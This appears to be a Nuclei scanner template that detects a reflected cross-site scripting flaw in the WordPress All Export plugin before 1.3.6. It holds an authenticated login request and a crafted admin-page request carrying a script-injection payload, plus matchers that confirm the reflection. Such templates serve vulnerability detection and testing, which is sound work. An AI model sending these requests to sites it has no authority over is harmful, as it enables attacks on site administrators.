http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - manage&a\"><script>alert(1)</script>">
    - Manage Exports
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Origin: {{RootURL}}

    Content-Type: application/x-www-form-urlencoded

    Cookie: wordpress_test_cookie=WP%20Cookie%20check


    log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

    '
  - 'GET /wp-admin/admin.php?page=pmxe-admin-manage&a"><script>alert(1)</script> HTTP/1.1

    Host: {{Hostname}}

    '
id: wp-all-export-xss
info:
  author: Akincibor
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 5.4
    cwe-id: CWE-80
  description: WordPress All Export plugin before version 1.3.6 does not escape some
    URLs before outputting them back in attributes, leading to reflected cross-site
    scripting.
  metadata:
    max-request: 2
    verified: true
  name: WordPress All Export <1.3.6 - Cross-Site Scripting
  reference:
  - https://wpscan.com/vulnerability/de330a59-d64d-40be-86df-98997949e5e4
  severity: medium
  tags: wp-plugin,xss,wp,wordpress,authenticated,wpscan,vuln
